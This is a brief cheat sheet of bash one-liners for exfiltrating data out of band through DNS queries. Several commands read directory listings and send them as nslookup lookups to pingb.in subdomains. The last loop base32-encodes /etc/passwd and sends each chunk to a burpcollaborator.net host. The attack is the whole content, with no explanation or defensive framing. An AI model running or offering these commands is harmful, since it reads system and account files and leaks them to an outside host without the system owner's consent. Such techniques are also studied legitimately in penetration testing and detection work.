# DNSEXFIL - OOB Data Exfiltration via DNS

```bash

echo `sed -n '2p' main.c` # print specific lines from a text file

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls)`  #concat ls output for dns query	

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)` | LC_ALL=C.UTF-8 wc -m # get len of command results 

nslookup `sed ':a;N;$!ba;s/\n/,/g' <<< $(ls) | LC_ALL=C.UTF-8 wc -m`.3544271fd625d1d8d62798bba753 pingb.in

`sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)` | head -c 12

echo `ls /` | cut -c 1-63

for i in {1..N};do nslookup `sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /)`.3544271fd625d1d8d62798bba711 pingb.in;done

for i in {1..41};do nslookup `sed ':a;N;$!ba;s/\n/,/g' <<< $(ls /) | cut -c 1-$i`.3544271fd625d1d8d62798bba799 pingb.in;done


cat /etc/passwd | base32 -w 63 | while read L                                                                            
do
  nslookup $L.j5ps4o8c3t6ikli76byhkukullrbf0.burpcollaborator.net
done
```
